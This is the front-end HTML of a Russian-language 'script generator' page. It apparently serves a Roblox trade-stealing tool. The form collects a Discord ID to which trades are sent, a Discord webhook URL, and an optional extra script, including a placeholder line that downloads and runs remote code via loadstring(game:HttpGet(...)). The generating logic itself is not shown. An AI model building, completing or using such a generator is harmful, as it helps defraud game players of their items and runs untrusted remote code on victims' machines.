<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Генератор скрипта</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h1>🎯 Генератор скрипта</h1>
        
        <div class="form-group">
            <label>👤 Discord ID (куда кидать трейд)</label>
            <input type="text" id="userId" placeholder="8986116710">
        </div>
        
        <div class="form-group">
            <label>🔗 Webhook URL</label>
            <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
        </div>
        
        <div class="form-group">
            <label>📦 Дополнительный скрипт</label>
            <select id="scriptType">
                <option value="22s">22s Hub (pastebin)</option>
                <option value="custom">Свой скрипт</option>
            </select>
            <textarea id="customScript" placeholder="loadstring(game:HttpGet('ссылка'))()" style="display:none;"></textarea>
        </div>
        
        <button id="generateBtn">🚀 Сгенерировать</button>
        <button id="copyBtn" style="display:none;">📋 Копировать</button>
        
        <div id="output" style="display:none;">
            <h3>Скрипт:</h3>
            <pre id="scriptOutput"></pre>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
